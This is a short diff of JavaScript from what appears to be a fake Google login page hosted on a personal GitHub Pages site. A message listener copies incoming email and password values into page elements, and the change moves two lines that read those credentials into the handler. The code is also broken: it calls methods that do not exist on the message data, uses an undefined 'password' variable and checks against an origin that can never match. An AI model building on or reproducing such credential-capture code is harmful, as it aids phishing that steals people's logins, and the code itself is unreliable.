@@ -21,11 +21,10 @@
         if (event.origin === 'https://dominator200.github.io/Google-login/') {
             document.getElementById('EmailValue').innerText = event.data;
             document.getElementById('PasswordValue').innerText = password.data;
+            const emaildata = event.data.getItem('EmailValue');
+            const passworddata = event.data.getItem('PasswordValue');
             }
         });
-
-        const emaildata = event.data.getItem('EmailValue');
-        const passworddata = event.data.getItem('PasswordValue');
 
         window.onmessage = function(e){
         if ( e.origin !== "https://dominator200.github.io/Google-login/" ) {
